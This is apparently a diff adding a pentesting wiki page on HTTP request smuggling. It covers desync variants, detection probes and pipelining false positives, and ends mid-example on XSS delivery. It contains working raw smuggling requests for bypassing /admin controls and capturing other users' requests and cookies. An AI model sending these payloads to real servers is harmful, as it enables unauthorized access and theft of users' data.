@@ -1,0 +1,1145 @@
+# HTTP Request Smuggling / HTTP Desync Attack
+
+{{#include ../../banners/hacktricks-training.md}}
+
+
+## What is
+
+This vulnerability occurs when a **desynchronization** between a **front-end proxy** and a **back-end server** lets an attacker send an HTTP message that the front end interprets as **one request** but the back end interprets as **two requests**. The injected bytes can then alter how the back end processes the next user's request.<sup>[[1]](#references)</sup>
+
+### Theory
+
+[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)
+
+> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.
+
+**Content-Length**
+
+> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.
+
+**Transfer-Encoding: chunked**
+
+> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
+> Chunked means that large data is sent in a series of chunks
+
+### Reality
+
+The **front end** (a load balancer or reverse proxy) processes one of the _**Content-Length**_ or _**Transfer-Encoding**_ headers while the **back end** processes the other, causing a **desynchronization** between the two systems.<sup>[[4]](#references)</sup>\
+This could be very critical as **an attacker will be able to send one request** to the reverse proxy that will be **interpreted** by the **back-end** server **as 2 different requests**. The **danger** of this technique resides in the fact the **back-end** server **will interpret** the **2nd request injected** as if it **came from the next client** and the **real request** of that client will be **part** of the **injected request**.
+
+### Particularities
+
+Remember that in HTTP **a new line character is composed by 2 bytes:**
+
+- **Content-Length**: This header uses a **decimal number** to indicate the **number** of **bytes** of the **body** of the request. The body is expected to end in the last character, **a new line is not needed in the end of the request**.
+- **Transfer-Encoding:** This header uses in the **body** an **hexadecimal number** to indicate the **number** of **bytes** of the **next chunk**. The **chunk** must **end** with a **new line** but this new line **isn't counted** by the length indicator. This transfer method must end with a **chunk of size 0 followed by 2 new lines**: `0`
+- **Connection**: Based on my experience it's recommended to use **`Connection: keep-alive`** on the first request of the request Smuggling.
+
+### Visible - Hidden
+
+HTTP/1.1 commonly carries multiple requests over the same persistent TCP connection. A parsing discrepancy between systems on that connection can make one transmitted request appear as two or more requests to the final back end or an intermediary.
+
+**[This research](https://portswigger.net/research/http1-must-die)** proposes ways to detect desynchronization behavior that WAFs may miss. Its visible-versus-hidden model looks for response discrepancies caused by differential parsing without immediately exploiting cross-user impact.<sup>[[15]](#references)</sup>
+
+For example, compare a normal `Host` header with a space-prefixed ` host` header. If the back end rejects the latter value while the front end ignores the malformed header, the differing interpretations are a strong desynchronization signal.
+
+This would be a **Hidden-Visible discrepancy**.
+
+If the front-end would have taken into account the " host" header but the front-end didn't, this could have been a **Visible-Hidden** situation.
+
+This technique revealed discrepancies between AWS ALB and IIS: `Host: foo/bar` produced `400, Server: awselb/2.0`, whereas `Host : foo/bar` produced `400, Server: Microsoft-HTTPAPI/2.0`, indicating that the latter request reached the back end. This is a hidden-visible (H-V) case.
+
+Note that this situation is not corrected in the AWS, but it can be prevented setting `routing.http.drop_invalid_header_fields.enabled` and `routing.http.desync_mitigation_mode = strictest`.<sup>[[15]](#references)</sup>
+
+
+## Basic Examples
+
+> [!TIP]
+> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.
+
+HTTP request smuggling attacks are crafted by sending ambiguous requests that exploit discrepancies in how front-end and back-end servers interpret the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. These attacks can manifest in different forms, primarily as **CL.TE**, **TE.CL**, and **TE.TE**. Each type represents a unique combination of how the front-end and back-end servers prioritize these headers. The vulnerabilities arise from the servers processing the same request in different ways, leading to unexpected and potentially malicious outcomes.<sup>[[1]](#references)</sup>
+
+### Basic Examples of Vulnerability Types
+
+| Type | Front end uses | Back end uses | Result |
+| --- | --- | --- | --- |
+| **CL.TE** | `Content-Length` | `Transfer-Encoding` | The back end treats bytes left after its terminating chunk as the start of the next request. |
+| **TE.CL** | `Transfer-Encoding` | `Content-Length` | The back end consumes only the length it trusts and leaves the remaining bytes queued. |
+| **TE.TE** | `Transfer-Encoding` | Obfuscated or differently parsed `Transfer-Encoding` | One hop ignores or interprets an obfuscated TE header differently, reducing the case to CL.TE or TE.CL behavior. |
+
+These labels describe which framing rule each hop trusts; the concrete requests below show how the disagreement is constructed.<sup>[[1]](#references)</sup><sup>[[6]](#references)</sup>
+
+> [!TIP]
+> To the previous table you should add the TE.0 technique, like CL.0 technique but using Transfer Encoding.
+
+#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)
+
+- **Front-End (CL):** Processes the request based on the `Content-Length` header.<sup>[[6]](#references)</sup>
+- **Back-End (TE):** Processes the request based on the `Transfer-Encoding` header.
+- **Attack Scenario:**
+
+  - The attacker sends a request where the `Content-Length` header's value does not match the actual content length.
+  - The front-end server forwards the entire request to the back-end, based on the `Content-Length` value.
+  - The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting the remaining data as a separate, subsequent request.
+  - **Example:**
+
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 30
+    Connection: keep-alive
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    Foo: x
+    ```
+
+#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)
+
+- **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.
+- **Back-End (CL):** Processes the request based on the `Content-Length` header.
+- **Attack Scenario:**
+
+  - The attacker sends a chunked request where the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.
+  - The front-end server, honoring `Transfer-Encoding`, forwards the entire request to the back-end.
+  - The back-end server, respecting `Content-Length`, processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.
+  - **Example:**
+
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 4
+    Connection: keep-alive
+    Transfer-Encoding: chunked
+
+    7b
+    GET /404 HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 30
+
+    x=
+    0
+
+    ```
+
+#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)
+
+- **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring it via obfuscation.
+- **Attack Scenario:**
+
+  - The attacker sends a request with obfuscated `Transfer-Encoding` headers.
+  - Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability may be exploited.
+  - The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent request, leading to smuggling.
+  - **Example:**
+
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: xchunked
+    Transfer-Encoding : chunked
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+    Transfer-Encoding:[tab]chunked
+    [space]Transfer-Encoding: chunked
+    X: X[\n]Transfer-Encoding: chunked
+
+    Transfer-Encoding
+    : chunked
+    ```
+
+#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**
+
+- Both servers process the request based solely on the `Content-Length` header.
+- This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the request length.
+- **Example:**
+
+  ```
+  POST / HTTP/1.1
+  Host: vulnerable-website.com
+  Content-Length: 16
+  Connection: keep-alive
+
+  Normal Request
+  ```
+
+#### **CL.0 Scenario**
+
+- Refers to scenarios where the `Content-Length` header is present and has a value other than zero, indicating that the request body has content. The back-end ignores the `Content-Length` header (which is treated as 0), but the front-end parses it.
+- It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request.
+- **Example:**
+
+  ```
+  POST / HTTP/1.1
+  Host: vulnerable-website.com
+  Content-Length: 16
+  Connection: keep-alive
+
+  Non-Empty Body
+  ```
+
+#### TE.0 Scenario
+
+- Like the previous one but using TE
+- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)<sup>[[9]](#references)</sup>
+- **Example**:
+
+```
+OPTIONS / HTTP/1.1
+Host: {HOST}
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+50
+GET <http://our-collaborator-server/> HTTP/1.1
+x: X
+0
+EMPTY_LINE_HERE
+EMPTY_LINE_HERE
+```
+
+#### `0.CL` Scenario
+
+In a `0.CL` sitation a request is send with a Content-Length like:
+
+```
+GET /Logon HTTP/1.1
+Host: <redacted>
+Content-Length:
+ 7
+
+GET /404 HTTP/1.1
+X: Y
+```
+
+And the front-end doesn't take the `Content-Length` into account so it only sends the first request to the backend (until the 7 in the example). However, the backend sees the `Content-Length` and waits for a body that never arrives cause the front-end is already waiting for the response.
+
+However, if there is a request that it's possible to send to the backend that is responded before receiving the body of the request, this deadlock won't occure. In IIS for example this happen sending requests to forbidden words like `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), this way, the initial request will be responded directly and the second requets will contain the request of the victim like:
+
+```
+GET / HTTP/1.1
+X: yGET /victim HTTP/1.1
+Host: <redacted>
+```
+
+This is useful to cause a desync, but it won't have any impact until now.
+
+However, the post offers a solution for this by converting a **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.<sup>[[15]](#references)</sup>
+
+#### Emerging trigger families (2026)
+
+Recent large-scale desync research produced several reusable **non-classic triggers** worth testing in addition to CL.TE / TE.CL / TE.0:<sup>[[22]](#references)</sup>
+
+- **HTTP/1.0 + `Transfer-Encoding`**: some chains change framing as soon as `Transfer-Encoding` exists, even when the value is not `chunked`. `Transfer-Encoding: gzip` was enough to trigger CL.0-style desyncs because one hop still honored `Content-Length` while another treated the HTTP/1.0 message as faulty framed.<sup>[[22]](#references)</sup>
+- **Response-only semantics inside requests**: `Content-Type: multipart/byteranges` can behave like a CL.0 trigger when one component reuses response-side multipart logic and effectively treats the request as bodyless while another still honors `Content-Length`. This generalizes into **Shared-Parser Confusion**: also test response-oriented features such as `Location`, `Set-Cookie`, `Range`, cache invalidation, and CONNECT tunnel state changes inside requests.<sup>[[22]](#references)</sup>
+- **Dual-matching `Content-Length`**: some servers treat **any duplicate `Content-Length`** as “no body”, even when both values are identical, valid, and exactly match the body size. Another hop may accept the shared length, creating a CL.0-like desync with otherwise clean framing. Whitespace-prefixed / obs-fold-like placement of the second header is worth testing too.<sup>[[22]](#references)</sup>
+- **CONNECT tunnel confusion**: after a successful `CONNECT`, trailing bytes from the CONNECT request can prefix the next request (for example `XGET ...`). This is mainly interesting behind front-ends that forward CONNECT upstream.<sup>[[22]](#references)</sup>
+
+Minimal dual-matching probe:
+
+```http
+GET / HTTP/1.1
+Host: target
+Content-Length: 28
+Content-Length: 28
+
+GET /x HTTP/5.1
+X: X
+```
+
+A later victim request receiving `505 HTTP Version Not Supported` is a strong sign that the embedded request crossed a boundary.<sup>[[22]](#references)</sup>
+
+#### Breaking the web server
+
+This technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data** but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP request**.
+
+For example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was created with the header **`Connection: keep-alive`**, the body of the request won’t be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.<sup>[[10]](#references)</sup>
+
+#### Forcing via hop-by-hop headers
+
+Abusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
+
+```
+Connection: Content-Length
+```
+
+For **more information about hop-by-hop headers** visit:
+
+
+{{#ref}}
+../abusing-hop-by-hop-headers.md
+{{#endref}}
+
+## Finding HTTP Request Smuggling
+
+Identifying HTTP request smuggling vulnerabilities can often be achieved using timing techniques, which rely on observing how long it takes for the server to respond to manipulated requests. These techniques are particularly useful for detecting CL.TE and TE.CL vulnerabilities. Besides these methods, there are other strategies and tools that can be used to find such vulnerabilities:<sup>[[2]](#references)</sup>
+
+### Finding CL.TE Vulnerabilities Using Timing Techniques
+
+- **Method:**
+
+  - Send a TE.CL probe whose back end, if vulnerable, waits for the remaining bytes implied by `Content-Length`.
+  - **Example:**
+
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Connection: keep-alive
+    Content-Length: 4
+
+    1
+    A
+    0
+    ```
+
+  - **Observation:**
+    - The front-end server processes the request based on `Content-Length` and cuts off the message prematurely.
+    - The back-end server, expecting a chunked message, waits for the next chunk that never arrives, causing a delay.
+
+- **Indicators:**
+  - Timeouts or long delays in response.
+  - Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.
+
+### Finding TE.CL Vulnerabilities Using Timing Techniques
+
+- **Method:**
+
+  - Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.
+  - **Example:**
+
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Connection: keep-alive
+    Content-Length: 6
+
+    0
+    X
+    ```
+
+  - **Observation:**
+    - The front-end server processes the request based on `Transfer-Encoding` and forwards the entire message.
+    - The back-end server, expecting a message based on `Content-Length`, waits for additional data that never arrives, causing a delay.
+
+### Other Methods to Find Vulnerabilities
+
+- **Differential Response Analysis:**
+  - Send slightly varied versions of a request and observe if the server responses differ in an unexpected way, indicating a parsing discrepancy.
+- **Using Automated Tools:**
+  - Tools like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses.
+- **Content-Length Variance Tests:**
+  - Send requests with varying `Content-Length` values that are not aligned with the actual content length and observe how the server handles such mismatches.
+- **Transfer-Encoding Variance Tests:**
+  - Send requests with obfuscated or malformed `Transfer-Encoding` headers and monitor how differently the front-end and back-end servers respond to such manipulations.
+
+### The `Expect: 100-continue` header
+
+Check how this header can help exploiting a http desync in:
+
+{{#ref}}
+../../network-services-pentesting/pentesting-web/special-http-headers.md
+{{#endref}}
+
+## CRLF-powered request splitting and desynchronization
+
+If attacker-controlled data is URL-decoded before a reverse proxy copies it into an upstream HTTP/1 request, `%0d%0a` stops being just response/header injection and becomes a request-smuggling primitive. A common example is Nginx `proxy_pass http://backend$uri;`, because `$uri` is normalized before the upstream request is constructed. The same sink can hide in regex captures, query parameters, cookie values, or custom upstream headers populated from request data. See also [CRLF (%0D%0A) Injection](../crlf-0d-0a.md).<sup>[[23]](#references)</sup>
+
+### Detection notes
+
+- Prefer payloads that should trigger a **distinct upstream status code** if the injected bytes reached the back end: invalid HTTP version (`505`), unsupported `Transfer-Encoding` (`501`), invalid `Expect` (`417`), or a malformed `Content-Length` (`400`).<sup>[[23]](#references)</sup>
+- If `CRLFCRLF` immediately causes `400` and connection close, do **not** discard the sink yet: some targets still allow **single-header injection**, which is enough for `CL.TE` or request-tunnelling style desyncs.<sup>[[23]](#references)</sup>
+- Do not limit testing to the path. In real targets the vulnerable value may be copied into the upstream request line from a **cookie/session token**, or injected into a **custom upstream header** first and only later broken out into a second request.<sup>[[23]](#references)</sup>
+
+### Escalation patterns
+
+- **Request splitting / response queue poisoning:** if two CRLF pairs survive, terminate the first header block and append a complete second request. One front-end request then becomes two back-end requests, shifting the response queue and enabling cross-user response theft, cache poisoning, and sometimes cross-tenant leakage when the smuggled `Host` can be changed on shared CDN infrastructure.<sup>[[23]](#references)</sup>
+- **Single-header fallback -> CRLF-powered `CL.TE`:** if only one injected header survives, add `Transfer-Encoding: chunked` while the front end still honors a normal `Content-Length`. An incomplete chunk is a strong confirmation probe because the back end waits for more body bytes; exploitation is the usual `0\r\n\r\n<smuggled-prefix>` pattern that consumes the next request on the reused connection.<sup>[[23]](#references)</sup>
+- **Blind request-tunnelling disclosure with `Expect`:** when the inner request is processed on a private upstream but the response is normally hidden, inject `Expect: 100-continue`. Some Nginx flows relay the unexpected `100 Continue` plus the tunneled response, which also enables bypass of front-end-only ACLs by placing an allowed path in the outer request and a protected path in the inner one.<sup>[[23]](#references)</sup>
+- **Browser-sendable desyncs:** because the control bytes can live in the URL path or POST body instead of forbidden custom headers, many CRLF-powered desyncs are reachable via navigation or `fetch()`, which makes connection-locked and IP-locked variants practical once a server-side sink is confirmed.<sup>[[23]](#references)</sup>
+
+### HTTP Request Smuggling Vulnerability Testing
+
+After confirming the effectiveness of timing techniques, it's crucial to verify if client requests can be manipulated. A straightforward method is to attempt poisoning your requests, for instance, making a request to `/` yield a 404 response. The `CL.TE` and `TE.CL` examples previously discussed in [Basic Examples](#basic-examples) demonstrate how to poison a client's request to elicit a 404 response, despite the client aiming to access a different resource.
+
+**Key Considerations**
+
+When testing for request smuggling vulnerabilities by interfering with other requests, bear in mind:
+
+- **Distinct Network Connections:** The "attack" and "normal" requests should be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the vulnerability's presence.
+- **Consistent URL and Parameters:** Aim to use identical URLs and parameter names for both requests. Modern applications often route requests to specific back-end servers based on URL and parameters. Matching these increases the likelihood that both requests are processed by the same server, a prerequisite for a successful attack.
+- **Timing and Racing Conditions:** The "normal" request, meant to detect interference from the "attack" request, competes against other concurrent application requests. Therefore, send the "normal" request immediately following the "attack" request. Busy applications may necessitate multiple trials for conclusive vulnerability confirmation.
+- **Load Balancing Challenges:** Front-end servers acting as load balancers may distribute requests across various back-end systems. If the "attack" and "normal" requests end up on different systems, the attack won't succeed. This load balancing aspect may require several attempts to confirm a vulnerability.
+- **Unintended User Impact:** If your attack inadvertently impacts another user's request (not the "normal" request you sent for detection), this indicates your attack influenced another application user. Continuous testing could disrupt other users, mandating a cautious approach.
+
+### Generic cross-request contamination detection
+
+Timing probes are still useful for CL.TE / TE.CL deadlocks, but newer tooling also looks for any reproducible **cross-request contamination** instead of guessing the desync class first. Record a stable **control/victim** request and its normal response, send a candidate trigger on a **separate connection**, then immediately repeat the same victim request. If the victim response changes reproducibly, request isolation is broken even if you do not yet know whether the bug is CL.0, TE.0, response-queue poisoning, or something stranger.<sup>[[22]](#references)</sup>
+
+A good classification trick is to place a **recognizable request** in the apparent body and look for a distinctive downstream response. For example, `GET / HTTP/777` should provoke `505 HTTP Version Not Supported`, and a smuggled `TRACE` request can reflect escaped bytes back in the response. This finds unknown desync classes without hard-coding the parser discrepancy first.<sup>[[22]](#references)</sup>
+
+### Clean probes vs dirty probes
+
+Do not treat “two responses came back” as proof by itself. If the trigger is ambiguous enough that the target could legitimately parse it as **two pipelined requests**, you may have only observed normal HTTP/1.1 behavior. Prefer **clean probes**: RFC-compliant requests with one unambiguous body boundary. If a clean request still causes a second response, or changes a later victim response, that is a much stronger desync signal.<sup>[[22]](#references)</sup>
+
+### Protocol-ruler transformation detection
+
+If the back-end has a sharp **maximum header length**, use that limit as a black-box ruler to detect front-end rewriting even when no header is reflected. Measure the largest accepted header value, replace a couple of known bytes with a candidate byte sequence, and measure again. If two bytes make the acceptance boundary shrink by ~10 bytes, the front-end likely expanded or normalized them before forwarding. This is useful for finding Unicode/mojibake rewrites, header dropping/overrides, and spoofing-header normalization that can later produce FE↔BE parser disagreement.<sup>[[22]](#references)</sup>
+
+```http
+GET / HTTP/1.1
+Host: target
+A: AAA...{64040}    -> 200
+
+GET / HTTP/1.1
+Host: target
+A: AAA...{64041}    -> 400
+```
+
+```http
+GET / HTTP/1.1
+Host: target
+A: <candidate-bytes>AAA...{64030}    -> 200
+```
+
+> [!TIP]
+> If you want to automate **trigger generation, permutation, and validation** instead of only manual probing, check [AI-Assisted Fuzzing & Automated Vulnerability Discovery](../../AI/AI-Assisted-Fuzzing-and-Vulnerability-Discovery.md) for the generalized LLM/evaluator patterns behind HTTP Terminator.<sup>[[22]](#references)</sup>
+
+## Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling
+
+Connection reuse (keep-alive) and pipelining can easily produce illusions of "smuggling" in testing tools that send multiple requests on the same socket. Learn to separate harmless client-side artifacts from real server-side desync.<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup>
+
+### Why pipelining creates classic false positives
+
+HTTP/1.1 reuses a single TCP/TLS connection and concatenates requests and responses on the same stream. In pipelining, the client sends multiple requests back-to-back and relies on in-order responses. A common false-positive is to resend a malformed CL.0-style payload twice on a single connection:
+
+```
+POST / HTTP/1.1
+Host: hackxor.net
+Content_Length: 47
+
+GET /robots.txt HTTP/1.1
+X: Y
+```
+
+Responses may look like:
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+```
+```
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+User-agent: *
+Disallow: /settings
+```
+
+If the server ignored the malformed `Content_Length`, there is no FE↔BE desync. With reuse, your client actually sent this byte-stream, which the server parsed as two independent requests:
+
+```
+POST / HTTP/1.1
+Host: hackxor.net
+Content_Length: 47
+
+GET /robots.txt HTTP/1.1
+X: YPOST / HTTP/1.1
+Host: hackxor.net
+Content_Length: 47
+
+GET /robots.txt HTTP/1.1
+X: Y
+```
+
+Impact: none. You just desynced your client from the server framing.
+
+> [!TIP]
+> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".
+
+### Litmus tests: pipelining or real desync?
+
+1. Disable reuse and re-test
+   - In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
+   - In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
+   - If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
+2. HTTP/2 nested-response check
+   - Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
+3. Partial-requests probe for connection-locked front-ends
+   - Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
+   - See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.<sup>[[13]](#references)</sup>
+4. State probes
+   - Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
+   - Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
+5. Visualize the wire
+   - Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.
+
+### Connection‑locked request smuggling (reuse-required)
+
+Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
+- Prove the server-side bug
+  - Use the HTTP/2 nested-response check, or
+  - Use partial-requests to show the FE only reuses upstream when the client does.
+- Show real impact even if direct cross-user socket abuse is blocked:
+  - Cache poisoning: poison shared caches via the desync so responses affect other users.
+  - Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
+  - Bypass FE controls: smuggle restricted paths/methods past the front-end.
+  - Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
+- Operator workflow
+  - Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
+  - Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.
+
+> See also connection‑state attacks, which are closely related but not technically smuggling:
+>
+>{{#ref}}
+>../http-connection-request-smuggling.md
+>{{#endref}}
+
+### Client‑side desync constraints
+
+If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.<sup>[[14]](#references)</sup>
+
+For background and end-to-end workflows:
+
+{{#ref}}
+browser-http-request-smuggling.md
+{{#endref}}
+
+### Tooling to help decide
+
+- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
+- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
+- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
+- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.
+
+> [!NOTE]
+> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).
+
+## Abusing HTTP Request Smuggling
+
+### Circumventing Front-End Security via HTTP Request Smuggling
+
+Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.<sup>[[3]](#references)</sup>
+
+Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:
+
+**CL.TE Example**
+
+```
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+
+In the CL.TE attack, the `Content-Length` header is leveraged for the initial request, while the subsequent embedded request utilizes the `Transfer-Encoding: chunked` header. The front-end proxy processes the initial `POST` request but fails to inspect the embedded `GET /admin` request, allowing unauthorized access to the `/admin` path.
+
+**TE.CL Example**
+
+```
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 4
+Transfer-Encoding: chunked
+2b
+GET /admin HTTP/1.1
+Host: localhost
+a=x
+0
+
+```
+
+Conversely, in the TE.CL attack, the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.
+
+### Revealing front-end request rewriting <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>
+
+Applications often employ a **front-end server** to modify incoming requests before passing them to the back-end server. A typical modification involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information or endpoints**.<sup>[[3]](#references)</sup>
+
+To investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the response. Then, craft a request, using this parameter last, similar to the following:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+search=
+```
+
+In this structure, subsequent request components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose the headers of the subsequent request.
+
+It's important to align the `Content-Length` header of the nested request with the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will truncate the reflected data, while too high a value can cause the request to error out.
+
+This technique is also applicable in the context of a TE.CL vulnerability, but the request should terminate with `search=\r\n0`. Regardless of the newline characters, the values will append to the search parameter.
+
+This method primarily serves to understand the request modifications made by the front-end proxy, essentially performing a self-directed investigation.
+
+### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>
+
+It's feasible to capture the requests of the next user by appending a specific request as the value of a parameter during a POST operation. Here's how this can be accomplished:<sup>[[3]](#references)</sup>
+
+By appending the following request as the value of a parameter, you can store the subsequent client's request:
+
+```
+POST / HTTP/1.1
+Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 319
+Connection: keep-alive
+Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
+Content-Length: 659
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
+
+csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
+```
+
+In this scenario, the **comment parameter** is intended to store the contents within a post's comment section on a publicly accessible page. Consequently, the subsequent request's contents will appear as a comment.
+
+However, this technique has limitations. Generally, it captures data only up to the parameter delimiter used in the smuggled request. For URL-encoded form submissions, this delimiter is the `&` character. This means the captured content from the victim user's request will stop at the first `&`, which may even be part of the query string.
+
+Additionally, it's worth noting that this approach is also viable with a TE.CL vulnerability. In such cases, the request should conclude with `search=\r\n0`. Regardless of newline characters, the values will be appended to the search parameter.
+
+### Using HTTP request smuggling to exploit reflected XSS
+
+HTTP Request Smuggling can be leveraged to exploit web pages vulnerable to **Reflected XSS**, offering significant advantages:
+
+- Interaction with the target users is **not required**.
+- Allows the exploitation of XSS in parts of the request that are **normally unattainable**, like HTTP request headers.<sup>[[3]](#references)</sup>
+
+In scenarios where a website is susceptible to Reflected XSS through the User-Agent header, the following payload demonstrates how to exploit this vulnerability:
+
+```
+POST / HTTP/1.1
+Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Cookie: session=ac311fa41f0aa1e880b0594d008d009e
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Length: 213
+Content-Type: application/x-www-form-urlencoded
+
+0
+
